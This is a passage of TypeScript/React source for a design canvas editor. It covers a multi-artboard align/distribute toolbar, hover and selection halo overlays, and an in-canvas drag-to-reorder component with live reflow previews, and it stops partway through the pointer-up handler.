function MultiArtboardToolbar({
  distributeArtboards,
  alignArtboards,
}: {
  distributeArtboards: (axis: 'x' | 'y') => void;
  alignArtboards: (mode: 'left' | 'right' | 'center-x' | 'top' | 'bottom' | 'center-y') => void;
}) {
  ensureMultiToolbarStyles();
  const { selected } = useSelectionSet();
  const ref = useRef<HTMLDivElement | null>(null);
  const rafRef = useRef<number | null>(null);

  const artboardSelections = useMemo(() => selected.filter((s) => !!s.artboardId), [selected]);
  const artboardCount = artboardSelections.length;
  const distributeOk = artboardCount >= 3;
  const alignOk = artboardCount >= 2;

  useEffect(() => {
    const div = ref.current;
    if (!div) return;
    if (artboardCount < 2) {
      div.style.display = 'none';
      return;
    }
    // Track the screen-coord union bbox of all selected artboards each
    // frame. Anchor toolbar centered horizontally above the bbox top
    // edge with a 14 px gap; flip BELOW if the top edge is < 60 px from
    // the viewport top.
    const tick = () => {
      rafRef.current = null;
      let xMin = Number.POSITIVE_INFINITY;
      let yMin = Number.POSITIVE_INFINITY;
      let xMax = Number.NEGATIVE_INFINITY;
      let yMax = Number.NEGATIVE_INFINITY;
      let any = false;
      for (const sel of artboardSelections) {
        const el = document.querySelector(`[data-dc-screen="${sel.artboardId}"]`);
        if (!el) continue;
        const r = (el as HTMLElement).getBoundingClientRect();
        if (r.width === 0 && r.height === 0) continue;
        any = true;
        if (r.left < xMin) xMin = r.left;
        if (r.top < yMin) yMin = r.top;
        if (r.right > xMax) xMax = r.right;
        if (r.bottom > yMax) yMax = r.bottom;
      }
      if (!any) {
        div.style.display = 'none';
        rafRef.current = requestAnimationFrame(tick);
        return;
      }
      // Make the toolbar visible OFFSCREEN first to measure its own
      // width, then move it to the anchor. (Cheap: only re-anchors on
      // every frame after the first.)
      div.style.display = 'flex';
      const tw = div.offsetWidth || 0;
      const centerX = (xMin + xMax) / 2;
      const top = yMin;
      const gap = 14;
      let anchorY = top - div.offsetHeight - gap;
      if (anchorY < 60) anchorY = yMax + gap; // flip below
      div.style.left = `${Math.round(centerX - tw / 2)}px`;
      div.style.top = `${Math.round(anchorY)}px`;
      rafRef.current = requestAnimationFrame(tick);
    };
    rafRef.current = requestAnimationFrame(tick);
    return () => {
      if (rafRef.current != null) cancelAnimationFrame(rafRef.current);
    };
  }, [artboardCount, artboardSelections]);

  if (artboardCount < 2) {
    return <div ref={ref} className="dc-multi-artboard-tb" aria-hidden="true" />;
  }

  return (
    <div
      ref={ref}
      className="dc-multi-artboard-tb"
      role="toolbar"
      aria-label="Multi-artboard actions"
    >
      <span className="dc-mab-count">{artboardCount} artboards</span>
      {/* G7 — align cluster. Icon-only to keep the toolbar narrow; full
          label lives in the tooltip + the right-click menu. Enabled at ≥ 2
          artboards (alignment is well-defined with 2). */}
      <button
        type="button"
        disabled={!alignOk}
        title={alignOk ? 'Align left' : 'Select at least 2 artboards to align'}
        aria-label="Align left"
        onClick={() => alignArtboards('left')}
      >
        <span className="dc-mab-icon" aria-hidden="true">
          <svg width="14" height="14" viewBox="0 0 14 14" fill="none" aria-hidden="true">
            <line x1="0.5" y1="0.5" x2="0.5" y2="13.5" stroke="currentColor" />
            <rect x="1" y="2" width="7" height="3" fill="currentColor" />
            <rect x="1" y="9" width="11" height="3" fill="currentColor" />
          </svg>
        </span>
      </button>
      <button
        type="button"
        disabled={!alignOk}
        title={alignOk ? 'Align center (horizontal)' : 'Select at least 2 artboards to align'}
        aria-label="Align center horizontally"
        onClick={() => alignArtboards('center-x')}
      >
        <span className="dc-mab-icon" aria-hidden="true">
          <svg width="14" height="14" viewBox="0 0 14 14" fill="none" aria-hidden="true">
            <line x1="7" y1="0.5" x2="7" y2="13.5" stroke="currentColor" />
            <rect x="3.5" y="2" width="7" height="3" fill="currentColor" />
            <rect x="1.5" y="9" width="11" height="3" fill="currentColor" />
          </svg>
        </span>
      </button>
      <button
        type="button"
        disabled={!alignOk}
        title={alignOk ? 'Align right' : 'Select at least 2 artboards to align'}
        aria-label="Align right"
        onClick={() => alignArtboards('right')}
      >
        <span className="dc-mab-icon" aria-hidden="true">
          <svg width="14" height="14" viewBox="0 0 14 14" fill="none" aria-hidden="true">
            <line x1="13.5" y1="0.5" x2="13.5" y2="13.5" stroke="currentColor" />
            <rect x="6" y="2" width="7" height="3" fill="currentColor" />
            <rect x="2" y="9" width="11" height="3" fill="currentColor" />
          </svg>
        </span>
      </button>
      <button
        type="button"
        disabled={!alignOk}
        title={alignOk ? 'Align top' : 'Select at least 2 artboards to align'}
        aria-label="Align top"
        onClick={() => alignArtboards('top')}
      >
        <span className="dc-mab-icon" aria-hidden="true">
          <svg width="14" height="14" viewBox="0 0 14 14" fill="none" aria-hidden="true">
            <line x1="0.5" y1="0.5" x2="13.5" y2="0.5" stroke="currentColor" />
            <rect x="2" y="1" width="3" height="7" fill="currentColor" />
            <rect x="9" y="1" width="3" height="11" fill="currentColor" />
          </svg>
        </span>
      </button>
      <button
        type="button"
        disabled={!alignOk}
        title={alignOk ? 'Align center (vertical)' : 'Select at least 2 artboards to align'}
        aria-label="Align center vertically"
        onClick={() => alignArtboards('center-y')}
      >
        <span className="dc-mab-icon" aria-hidden="true">
          <svg width="14" height="14" viewBox="0 0 14 14" fill="none" aria-hidden="true">
            <line x1="0.5" y1="7" x2="13.5" y2="7" stroke="currentColor" />
            <rect x="2" y="3.5" width="3" height="7" fill="currentColor" />
            <rect x="9" y="1.5" width="3" height="11" fill="currentColor" />
          </svg>
        </span>
      </button>
      <button
        type="button"
        disabled={!alignOk}
        title={alignOk ? 'Align bottom' : 'Select at least 2 artboards to align'}
        aria-label="Align bottom"
        onClick={() => alignArtboards('bottom')}
      >
        <span className="dc-mab-icon" aria-hidden="true">
          <svg width="14" height="14" viewBox="0 0 14 14" fill="none" aria-hidden="true">
            <line x1="0.5" y1="13.5" x2="13.5" y2="13.5" stroke="currentColor" />
            <rect x="2" y="6" width="3" height="7" fill="currentColor" />
            <rect x="9" y="2" width="3" height="11" fill="currentColor" />
          </svg>
        </span>
      </button>
      <span className="dc-mab-divider" aria-hidden="true" />
      <button
        type="button"
        disabled={!distributeOk}
        title={
          distributeOk
            ? 'Distribute horizontally — equal gaps between artboards'
            : 'Select at least 3 artboards to distribute'
        }
        aria-label="Distribute horizontally"
        onClick={() => distributeArtboards('x')}
      >
        <span className="dc-mab-icon" aria-hidden="true">
          <svg width="14" height="14" viewBox="0 0 14 14" fill="none" aria-hidden="true">
            <rect x="0.5" y="3" width="3" height="8" fill="currentColor" />
            <rect x="5.5" y="3" width="3" height="8" fill="currentColor" />
            <rect x="10.5" y="3" width="3" height="8" fill="currentColor" />
          </svg>
        </span>
      </button>
      <button
        type="button"
        disabled={!distributeOk}
        title={
          distributeOk
            ? 'Distribute vertically — equal gaps between artboards'
            : 'Select at least 3 artboards to distribute'
        }
        aria-label="Distribute vertically"
        onClick={() => distributeArtboards('y')}
      >
        <span className="dc-mab-icon" aria-hidden="true">
          <svg width="14" height="14" viewBox="0 0 14 14" fill="none" aria-hidden="true">
            <rect x="3" y="0.5" width="8" height="3" fill="currentColor" />
            <rect x="3" y="5.5" width="8" height="3" fill="currentColor" />
            <rect x="3" y="10.5" width="8" height="3" fill="currentColor" />
          </svg>
        </span>
      </button>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// HoverHalo — single floating overlay tracking the hovered element's screen
// bounds. Updates on every animation frame while mounted. Position: fixed so
// CSS `zoom` on the world plane never affects the 2 px border thickness.

function HoverHalo({ el }: { el: Element | null }) {
  const ref = useRef<HTMLDivElement | null>(null);
  const rafRef = useRef<number | null>(null);
  const targetRef = useRef<Element | null>(el);
  targetRef.current = el;

  useEffect(() => {
    if (!el) {
      if (ref.current) ref.current.style.display = 'none';
      return;
    }
    const tick = () => {
      rafRef.current = null;
      const div = ref.current;
      const t = targetRef.current;
      if (!div || !t?.isConnected) {
        if (div) div.style.display = 'none';
        return;
      }
      const r = (t as HTMLElement).getBoundingClientRect();
      if (r.width === 0 && r.height === 0) {
        div.style.display = 'none';
      } else {
        div.style.display = 'block';
        div.style.left = `${Math.round(r.left)}px`;
        div.style.top = `${Math.round(r.top)}px`;
        div.style.width = `${Math.round(r.width)}px`;
        div.style.height = `${Math.round(r.height)}px`;
      }
      rafRef.current = requestAnimationFrame(tick);
    };
    rafRef.current = requestAnimationFrame(tick);
    return () => {
      if (rafRef.current != null) cancelAnimationFrame(rafRef.current);
    };
  }, [el]);

  if (!el) return null;
  return <div ref={ref} className="dc-cv-halo dc-cv-halo--hover" aria-hidden="true" />;
}

// ─────────────────────────────────────────────────────────────────────────────
// SelectionHalos — N floating overlays, one per selected element. Resolves
// elements by `data-cd-id` when present, falling back to the selector path.

// DDR-046 — single-select halo carries 4 corner ticks; multi-select members get
// the lighter 1px tinted outline (no ticks). The GroupBbox renders the loud
// signal when selected.length > 1.
const TICK_CLASSES = ['tick-tl', 'tick-tr', 'tick-bl', 'tick-br'] as const;

function makeSelectedNode(withTicks: boolean): HTMLDivElement {
  const child = document.createElement('div');
  child.className = withTicks
    ? 'dc-cv-halo dc-cv-halo--selected'
    : 'dc-cv-halo dc-cv-halo--selected-member';
  child.setAttribute('aria-hidden', 'true');
  if (withTicks) {
    for (const cls of TICK_CLASSES) {
      const tick = document.createElement('i');
      tick.className = `tick ${cls}`;
      child.appendChild(tick);
    }
  }
  return child;
}

function SelectionHalos() {
  const { selected } = useSelectionSet();
  const containerRef = useRef<HTMLDivElement | null>(null);
  const rafRef = useRef<number | null>(null);

  useEffect(() => {
    if (selected.length === 0) {
      const c = containerRef.current;
      if (c) c.innerHTML = '';
      return;
    }
    const tick = () => {
      rafRef.current = null;
      const c = containerRef.current;
      if (!c) return;
      const wantsTicks = selected.length === 1;
      const wantClass = wantsTicks
        ? 'dc-cv-halo dc-cv-halo--selected'
        : 'dc-cv-halo dc-cv-halo--selected-member';
      // Match rendered halo count to selected.length; reuse DOM nodes.
      while (c.children.length < selected.length) {
        c.appendChild(makeSelectedNode(wantsTicks));
      }
      while (c.children.length > selected.length) {
        c.removeChild(c.lastChild as Node);
      }
      // When selection size crosses 1↔N+, swap class + tick children on each
      // existing node so reused nodes adopt the new visual idiom.
      for (let i = 0; i < c.children.length; i++) {
        const child = c.children[i] as HTMLDivElement;
        if (child.className !== wantClass) {
          child.className = wantClass;
          // Strip any existing ticks, then re-append if needed.
          while (child.firstChild) child.removeChild(child.firstChild);
          if (wantsTicks) {
            for (const cls of TICK_CLASSES) {
              const t = document.createElement('i');
              t.className = `tick ${cls}`;
              child.appendChild(t);
            }
          }
        }
      }
      for (let i = 0; i < selected.length; i++) {
        const sel = selected[i];
        const child = c.children[i] as HTMLDivElement;
        const el = sel ? resolveSelectionEl(document, sel) : null;
        if (!el) {
          child.style.display = 'none';
          continue;
        }
        // Post-Wave-2: artboard drag is now direct (article updates its own
        // `left/top` in real-time), so the halo can follow via
        // getBoundingClientRect — no special drag suppression needed.
        const r = (el as HTMLElement).getBoundingClientRect();
        if (r.width === 0 && r.height === 0) {
          child.style.display = 'none';
        } else {
          child.style.display = 'block';
          child.style.left = `${Math.round(r.left)}px`;
          child.style.top = `${Math.round(r.top)}px`;
          child.style.width = `${Math.round(r.width)}px`;
          child.style.height = `${Math.round(r.height)}px`;
        }
      }
      rafRef.current = requestAnimationFrame(tick);
    };
    rafRef.current = requestAnimationFrame(tick);
    return () => {
      if (rafRef.current != null) cancelAnimationFrame(rafRef.current);
    };
  }, [selected]);

  return <div ref={containerRef} aria-hidden="true" />;
}

// ─────────────────────────────────────────────────────────────────────────────
// ReorderDrag (Phase 12.1, DDR-138) — in-canvas drag-to-reorder, Figma-style.
// Grab the SELECTED element and drag: it FLOATS with the cursor (a `transform`
// applied inline, so its layout box stays reserved — the origin shows empty
// space — and it stays inside the zoomed world, keeping its styling + scale; we
// divide the screen delta by the element's own zoom so it tracks 1:1). The drop
// zone is the WHOLE hovered element split 50/50 — top/left half inserts BEFORE,
// bottom/right half AFTER (axis = parent flex direction) — so there's a wide hit
// area, not a thin divider to aim at; a blue DIVIDER marks the resulting seam, a
// dashed RING marks an EMPTY container it would nest INTO. Hover a stable target
// for SETTLE_MS and the layout reflows LIVE
// (the node moves there, still floating — you see the result before committing);
// per-mousemove the DOM never changes, so there's no jank / ping-pong. DROP
// commits via `dgn:'reorder-request'` to the shell (DDR-054: untrusted canvas
// REQUESTS, main-origin shell WRITES → source write → HMR remount renders the
// committed order); ESC aborts and restores the origin.
//
// Headless: a document-capture pointerdown that only ACTS when a bare drag
// starts on the single selected element with the move tool — a plain click and
// every other gesture (Cmd-select, marquee, pan, annotation, native button
// clicks) pass through untouched. Threshold-gated so a click is never a drag.

/** Read a usable `data-cd-id` off a live node, skipping dev-server chrome. */
function reorderCdId(node: Node | null): string | null {
  if (node?.nodeType !== 1) return null;
  const el = node as Element;
  if (el.closest('.dc-cv-halo, .dc-cv-group-bbox, .dgn-pin')) return null;
  return el.getAttribute('data-cd-id');
}

/** Suppress the synthetic click that fires after a drag so the drag doesn't
 *  also activate a button / link inside the dragged element. */
function suppressNextCanvasClick(): void {
  const onClick = (e: MouseEvent) => {
    e.preventDefault();
    e.stopImmediatePropagation();
    cleanup();
  };
  const cleanup = () => {
    document.removeEventListener('click', onClick, true);
    clearTimeout(t);
  };
  const t = setTimeout(cleanup, 350);
  document.addEventListener('click', onClick, true);
}

function ReorderDrag() {
  const { selected } = useSelectionSet();
  const { tool } = useToolMode();
  // The document pointerdown listener is stable; it reads the latest selection +
  // tool from refs so it doesn't need re-attaching on every selection change.
  const selRef = useRef(selected);
  selRef.current = selected;
  const toolRef = useRef(tool);
  toolRef.current = tool;

  useEffect(() => {
    type Target = { kind: 'before' | 'after' | 'inside'; el: HTMLElement; container: HTMLElement };
    type Drag = {
      pointerId: number;
      startX: number;
      startY: number;
      lastX: number;
      lastY: number;
      grabDX: number;
      grabDY: number;
      el: HTMLElement;
      cdId: string;
      zoom: number;
      prevStyle: string | null;
      dragging: boolean;
      target: Target | null;
      /** Where the node lived at lift — for the Esc restore. */
      origin: { parent: HTMLElement; next: Element | null } | null;
      /** Pending settle timer — fires the live-reflow preview. */
      settle: ReturnType<typeof setTimeout> | null;
      settleKey: string | null;
      /** The last PREVIEWED (already reflowed) drop, committed on release. */
      applied: { refId: string; position: 'before' | 'after' | 'inside-end' } | null;
      /** Stamped [data-cd-id] nodes in their ORIGINAL order — for computing a
       *  reused instance's occurrence index even after the DOM reflowed. */
      snapshot: Element[] | null;
      /** True when the dragged element is `position: absolute|fixed` — reorder
       *  (sibling order) never changes where an out-of-flow element paints, so
       *  these drags commit `left`/`top` instead of a tree move (see the
       *  "absolute element snaps back" RCA). */
      outOfFlow: boolean;
      /** Pre-drag `left`/`top` (px, resolved via computed style) — only
       *  meaningful when `outOfFlow`. */
      originLeft: number;
      originTop: number;
    };
    // Hover a stable spot this long and the layout reflows LIVE (the node moves
    // there while still floating with the cursor) — you see the result before
    // committing. Drop commits; Esc restores the origin.
    const SETTLE_MS = 500;
    let drag: Drag | null = null;
    let highlightEl: HTMLElement | null = null;
    let dividerEl: HTMLDivElement | null = null;
    // The last committed drop, kept so a shell 'reorder-failed' can undo the
    // optimistic DOM move (the write was rejected → nothing persisted).
    let lastCommit: { el: HTMLElement; parent: HTMLElement; next: Element | null } | null = null;
    // The last committed out-of-flow reposition, kept so a shell
    // 'reposition-failed' can restore the pre-drag inline style.
    let lastPosition: { el: HTMLElement; prevStyle: string | null } | null = null;

    const setHighlight = (el: HTMLElement | null) => {
      if (highlightEl === el) return;
      if (highlightEl) highlightEl.classList.remove('dc-cv-reorder-into');
      highlightEl = el;
      if (highlightEl) highlightEl.classList.add('dc-cv-reorder-into');
    };

    const hideDivider = () => {
      if (dividerEl) dividerEl.style.display = 'none';
    };
    const showDivider = (t: Target) => {
      if (!dividerEl) {
        dividerEl = document.createElement('div');
        dividerEl.className = 'dc-cv-reorder-divider';
        dividerEl.setAttribute('aria-hidden', 'true');
        document.body.appendChild(dividerEl);
      }
      const r = t.el.getBoundingClientRect();
      const pcs = getComputedStyle(t.container);
      const isRow = pcs.display.includes('flex') && pcs.flexDirection.startsWith('row');
      const el = dividerEl;
      el.style.display = 'block';
      if (isRow) {
        const cx = t.kind === 'before' ? r.left : r.right;
        el.style.left = `${Math.round(cx) - 1}px`;
        el.style.top = `${Math.round(r.top)}px`;
        el.style.width = '2px';
        el.style.height = `${Math.round(r.height)}px`;
      } else {
        const cy = t.kind === 'before' ? r.top : r.bottom;
        el.style.left = `${Math.round(r.left)}px`;
        el.style.top = `${Math.round(cy) - 1}px`;
        el.style.width = `${Math.round(r.width)}px`;
        el.style.height = '2px';
      }
    };

    // A genuinely EMPTY container (no element children, no text) is the only case
    // where before/after can't express "put it in here" — so the whole box nests
    // inside. Everything else splits 50/50 (see computeTarget).
    const isEmptyContainer = (el: HTMLElement): boolean =>
      el.childElementCount === 0 && !el.textContent?.trim();

    // Where would the node drop right now? Pure read — never mutates the DOM
    // (that only happens on drop), which is what keeps the drag jank-free.
    // The drop zone is the WHOLE element split 50/50: top/left half → before,
    // bottom/right half → after (axis follows the parent's flex direction). No
    // thin central "nest" band eating the target — the entire element is an easy,
    // wide hit. (Nesting into a container that HAS content = drop onto one of its
    // children; nesting into an EMPTY one = drop anywhere on it; deep nesting =
    // the Layers panel's Alt+Shift+↑/↓.)
    const computeTarget = (x: number, y: number, d: Drag): Target | null => {
      let E = document.elementFromPoint(x, y)?.closest('[data-cd-id]') as HTMLElement | null;
      while (E && (E === d.el || d.el.contains(E))) {
        E = E.parentElement
          ? (E.parentElement.closest('[data-cd-id]') as HTMLElement | null)
          : null;
      }
      if (!E || !reorderCdId(E)) return null;
      // While inside the dragged node's own parent, climb to that parent's direct
      // child so hovering a sibling's inner content still targets the sibling
      // (no deep-hit). Outside it, E stays deep → reparent OUT / INTO others.
      let anchor: HTMLElement = E;
      const sib = d.el.parentElement;
      if (sib?.contains(E)) {
        let s: HTMLElement | null = E;
        while (s && s.parentElement !== sib) s = s.parentElement as HTMLElement | null;
        if (s && s !== d.el && reorderCdId(s)) anchor = s;
      }
      if (isEmptyContainer(anchor) && !d.el.contains(anchor)) {
        return { kind: 'inside', el: anchor, container: anchor };
      }
      const parent = anchor.parentElement;
      const r = anchor.getBoundingClientRect();
      const pcs = parent ? getComputedStyle(parent) : null;
      const isRow = !!pcs && pcs.display.includes('flex') && pcs.flexDirection.startsWith('row');
      const frac = isRow ? (x - r.left) / (r.width || 1) : (y - r.top) / (r.height || 1);
      // Nest zone: the middle third of a CONTAINER (element that holds children)
      // nests INTO it. This is the only way to drop a node into a non-empty
      // container — before/after only ever inserts as a SIBLING, so without it a
      // node accidentally lifted to the root could never be dragged back into a
      // child div. Leaves keep the full 50/50 (no nest band eating the target).
      if (anchor.childElementCount > 0 && frac >= 0.34 && frac <= 0.66 && !d.el.contains(anchor)) {
        return { kind: 'inside', el: anchor, container: anchor };
      }
      if (!parent || parent === d.el || d.el.contains(parent)) return null;
      return { kind: frac < 0.5 ? 'before' : 'after', el: anchor, container: parent };
    };

    const targetToDrop = (
      t: Target
    ): { refId: string; position: 'before' | 'after' | 'inside-end' } | null => {
      if (t.kind === 'inside') {
        const id = reorderCdId(t.container);
        return id ? { refId: id, position: 'inside-end' } : null;
      }
      const id = reorderCdId(t.el);
      return id ? { refId: id, position: t.kind } : null;
    };

    // FLIP the siblings a reflow displaces so they GLIDE to their new slots
    // instead of jumping: record first-positions, run the DOM move, invert via
    // transform, then play to zero. Scoped to direct children of the affected
    // parent(s); descendants ride along. The dragged node is excluded — it has
    // its own cursor-following transform. Deltas divide by each element's own
    // zoom (screen px → world px), same math as the float. Respects
    // prefers-reduced-motion (skips straight to the end state).
    const REFLOW_MS = 180;
    const animateReflow = (moved: HTMLElement, act: () => void) => {
      if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
        act();
        return;
      }
      const first = new Map<HTMLElement, DOMRect>();
      const collect = (parent: Element | null) => {
        if (!parent) return;
        for (const c of Array.from(parent.children)) {
          const el = c as HTMLElement;
          if (el === moved || first.has(el)) continue;
          first.set(el, el.getBoundingClientRect());
        }
      };
      collect(moved.parentElement);
      act();
      collect(moved.parentElement); // reparent case — new siblings shift too
      const anims: Array<{ el: HTMLElement; prevTransform: string; prevTransition: string }> = [];
      for (const [el, r0] of first) {
        if (!el.isConnected) continue;
        const r1 = el.getBoundingClientRect();
        const dx = r0.left - r1.left;
        const dy = r0.top - r1.top;
        if (Math.abs(dx) < 0.5 && Math.abs(dy) < 0.5) continue;
        const zoom = el.offsetWidth ? r1.width / el.offsetWidth : 1;
        anims.push({ el, prevTransform: el.style.transform, prevTransition: el.style.transition });
        el.style.transition = 'none';
        el.style.transform = `translate(${dx / zoom}px, ${dy / zoom}px)`;
      }
      if (!anims.length) return;
      void document.body.offsetWidth; // flush the inverted state
      for (const a of anims) {
        a.el.style.transition = `transform ${REFLOW_MS}ms ease`;
        a.el.style.transform = 'translate(0px, 0px)';
      }
      setTimeout(() => {
        for (const a of anims) {
          if (!a.el.isConnected) continue;
          a.el.style.transition = a.prevTransition;
          a.el.style.transform = a.prevTransform;
        }
      }, REFLOW_MS + 40);
    };

    // Move the node to match the target (used by the settle preview AND the
    // final drop); the source write + HMR remount then re-render the committed
    // order.
    const applyDrop = (el: HTMLElement, t: Target) => {
      try {
        if (t.kind === 'inside') t.container.appendChild(el);
        else if (t.kind === 'before') t.container.insertBefore(el, t.el);
        else {
          let ref = t.el.nextElementSibling;
          if (ref === el) ref = el.nextElementSibling;
          t.container.insertBefore(el, ref);
        }
      } catch {
        /* detached — remount re-syncs */
      }
    };

    // Is the target where the node ALREADY sits? True after a settle preview
    // moved it — without this the timer would re-fire forever and the divider
    // would point at the node's own slot.
    const isCurrentPosition = (t: Target, d: Drag): boolean => {
      if (t.kind === 'before')
        return t.container === d.el.parentElement && t.el === d.el.nextElementSibling;
      if (t.kind === 'after')
        return t.container === d.el.parentElement && t.el === d.el.previousElementSibling;
      return t.container === d.el.parentElement && t.container.lastElementChild === d.el;
    };

    const clearSettle = (d: Drag) => {
      if (d.settle != null) clearTimeout(d.settle);
      d.settle = null;
      d.settleKey = null;
    };

    // The live reflow: move the node to the hovered target NOW (the origin gap
    // closes, a gap opens at the target) while it keeps floating under the
    // cursor — re-anchor the transform to the node's new layout slot so it
    // doesn't visually jump.
    const applyPreview = (d: Drag) => {
      d.settle = null;
      d.settleKey = null;
      const t = d.target;
      if (!t?.el.isConnected) return;
      const drop = targetToDrop(t);
      if (!drop) return;
      animateReflow(d.el, () => applyDrop(d.el, t));
      d.applied = drop;
      d.el.style.transform = 'none';
      const rect = d.el.getBoundingClientRect();
      d.zoom = d.el.offsetWidth ? rect.width / d.el.offsetWidth : 1;
      const tx = (d.lastX - d.grabDX - rect.left) / d.zoom;
      const ty = (d.lastY - d.grabDY - rect.top) / d.zoom;
      d.el.style.transform = `translate(${tx}px, ${ty}px)`;
      // Keep onMove's (client - start)/zoom math consistent from the new anchor.
      d.startX = d.lastX - tx * d.zoom;
      d.startY = d.lastY - ty * d.zoom;
      setHighlight(null);
      hideDivider();
    };

    // Esc — abort the drag: put the node back where it was lifted from and
    // restore its exact inline style. Nothing is committed.
    const cancelDrag = (d: Drag) => {
      clearSettle(d);
      const origin = d.origin;
      if (d.applied && origin) {
        try {
          animateReflow(d.el, () => origin.parent.insertBefore(d.el, origin.next));
        } catch {
          /* origin gone — remount re-syncs */
        }
      }
      if (d.prevStyle == null) d.el.removeAttribute('style');
      else d.el.setAttribute('style', d.prevStyle);
      setHighlight(null);
      hideDivider();
      suppressNextCanvasClick();
      drag = null;
      setElementDragActive(false);
    };

    const onKeyDown = (e: KeyboardEvent) => {
      if (e.key !== 'Escape' || !drag || !drag.dragging) return;
      e.preventDefault();
      e.stopImmediatePropagation(); // don't also clear the selection
      cancelDrag(drag);
    };

    const onDown = (e: PointerEvent) => {
      if (e.button !== 0 || e.metaKey || e.ctrlKey || e.shiftKey || e.altKey) return;
      if (toolRef.current !== 'move') return;
      const sel = selRef.current;
      const one = sel && sel.length === 1 ? sel[0] : null;
      const cdId = one && typeof one.id === 'string' ? one.id : null;
      if (!cdId || !one) return;
      const el = resolveSelectionEl(document, one) as HTMLElement | null;
      if (!el) return;
      // feature-4 T7b — a locked layer never drags (it can be selected from
      // the Layers panel, but the canvas won't move it).
      if (isLockedElement(el, cdId)) return;
      const t = e.target;
      if (!(t instanceof Node) || !el.contains(t)) return;
      // Candidate — do NOT claim yet (a plain click must still work). We only
      // become a drag once the pointer crosses the threshold in onMove.
      const outOfFlowPos = getComputedStyle(el).position;
      drag = {
        pointerId: e.pointerId,
        startX: e.clientX,
        startY: e.clientY,
        lastX: e.clientX,
        lastY: e.clientY,
        grabDX: 0,
        grabDY: 0,
        el,
        cdId,
        zoom: 1,
        prevStyle: null,
        dragging: false,
        target: null,
        origin: null,
        settle: null,
        settleKey: null,
        applied: null,
        snapshot: null,
        outOfFlow: outOfFlowPos === 'absolute' || outOfFlowPos === 'fixed',
        originLeft: 0,
        originTop: 0,
      };
    };

    const onMove = (e: PointerEvent) => {
      const d = drag;
      if (!d || e.pointerId !== d.pointerId) return;
      if (!d.dragging) {
        if (!crossedDragThreshold(d.startX, d.startY, e.clientX, e.clientY)) return;
        d.dragging = true;
        setElementDragActive(true);
        // Start floating: the element tracks the cursor via `transform`, so its
        // layout box stays reserved (origin shows empty space) and it stays in
        // the zoomed world (styling + scale intact). Divide the screen delta by
        // the element's own zoom (screen size / natural size) so it tracks 1:1.
        const rect = d.el.getBoundingClientRect();
        d.zoom = d.el.offsetWidth ? rect.width / d.el.offsetWidth : 1;
        d.grabDX = d.startX - rect.left;
        d.grabDY = d.startY - rect.top;
        d.origin = d.el.parentElement
          ? { parent: d.el.parentElement, next: d.el.nextElementSibling }
          : null;
        // Snapshot the original stamped-node order NOW — occurrence indices must
        // reflect the pre-drag layout, not the reflowed one.
        d.snapshot = [...document.querySelectorAll('[data-cd-id]')];
        d.prevStyle = d.el.getAttribute('style');
        if (d.outOfFlow) {
          // Resolved (used) value in px — matches the unit space `left`/`top`
          // are written back in, regardless of an ancestor's zoom transform
          // (a CSS `transform: scale()` on the world doesn't change a
          // descendant's own box-model values). `auto` (e.g. positioned via
          // `right`/`bottom` instead) falls back to 0 — a known v1 limit.
          const cs = getComputedStyle(d.el);
          d.originLeft = Number.parseFloat(cs.left) || 0;
          d.originTop = Number.parseFloat(cs.top) || 0;
        } else if (getComputedStyle(d.el).position === 'static') {
          d.el.style.position = 'relative';
        }
        d.el.style.zIndex = '9990';
        d.el.style.pointerEvents = 'none'; // so elementFromPoint sees what's beneath
        d.el.style.opacity = '0.9';
        d.el.style.cursor = 'grabbing';
        d.el.style.boxShadow = '0 10px 28px rgba(0, 0, 0, 0.28)';
        d.el.style.willChange = 'transform';
        d.el.style.transition = 'none';
      }
      d.lastX = e.clientX;
      d.lastY = e.clientY;
      const tx = (e.clientX - d.startX) / d.zoom;
      const ty = (e.clientY - d.startY) / d.zoom;
      d.el.style.transform = `translate(${tx}px, ${ty}px)`;
      // Out-of-flow elements free-move with the cursor — there's no sibling
      // "before/after" to hunt for (reordering an absolute/fixed element's
      // JSX siblings wouldn't change where it paints), so skip the reorder
      // target/divider/settle machinery entirely; onUp commits `left`/`top`.
      if (d.outOfFlow) return;
      // Indicator + settle scheduling only — the DOM moves when a target stays
      // stable for SETTLE_MS (the live-reflow preview), never per-mousemove.
      const target = computeTarget(e.clientX, e.clientY, d);
      const current = target ? isCurrentPosition(target, d) : false;
      d.target = target && !current ? target : null;
      if (!d.target) {
        clearSettle(d);
        setHighlight(null);
        hideDivider();
      } else {
        const t = d.target;
        if (t.kind === 'inside') {
          hideDivider();
          setHighlight(t.container);
        } else {
          setHighlight(null);
          showDivider(t);
        }
        const key = `${t.kind}:${reorderCdId(t.kind === 'inside' ? t.container : t.el) ?? ''}`;
        if (key !== d.settleKey) {
          if (d.settle != null) clearTimeout(d.settle);
          d.settleKey = key;
          d.settle = setTimeout(() => {
            if (drag === d && d.dragging) applyPreview(d);
          }, SETTLE_MS);
        }
      }
    };

    const onUp = (e: PointerEvent) => {
      const d = drag;
      drag = null;
      setElementDragActive(false);
      setHighlight(null);
      hideDivider();
      if (!d || e.pointerId !== d.pointerId) return;
      if (!d.dragging) return; // a plain click — leave it to native handlers
      clearSettle(d);
      // Occurrence index of a node among its like-id siblings, read from the
      // PRE-drag snapshot (the live DOM already reflowed for an in-flow drop). For
      // a reused component (many DOM nodes share one internal id) the server maps
      // this to the parent's distinct <Component> USAGE; 0 for a normal element.
      // Shared by the reposition (Stage H3 — instance move stays local) + reorder
      // posts below, so both anchor to the same instance the user dragged.
      const occ = (node: Element | null): number => {
        if (!node || !d.snapshot) return 0;
        const nid = node.getAttribute('data-cd-id');
        const at = d.snapshot.indexOf(node);
        if (!nid || at < 0) return 0;
        let c = 0;
        for (let k = 0; k < at; k++) {
          if (d.snapshot[k]?.getAttribute('data-cd-id') === nid) c++;
        }
        return c;
      };
      if (d.outOfFlow) {
        // Un-float: restore the pre-drag inline style (drops the drag-only
        // props AND the cursor-follow transform), then overlay the new
        // left/top — same "unfloat" step as reorder, but the position
        // sticks instead of reverting to `prevStyle`'s original left/top.
        if (d.prevStyle == null) d.el.removeAttribute('style');
        else d.el.setAttribute('style', d.prevStyle);
        const dx = (d.lastX - d.startX) / d.zoom;
        const dy = (d.lastY - d.startY) / d.zoom;
        if (Math.abs(dx) < 0.5 && Math.abs(dy) < 0.5) return; // negligible — nothing to persist
        const left = Math.round(d.originLeft + dx);
        const top = Math.round(d.originTop + dy);
        d.el.style.left = `${left}px`;
        d.el.style.top = `${top}px`;
        lastPosition = { el: d.el, prevStyle: d.prevStyle };
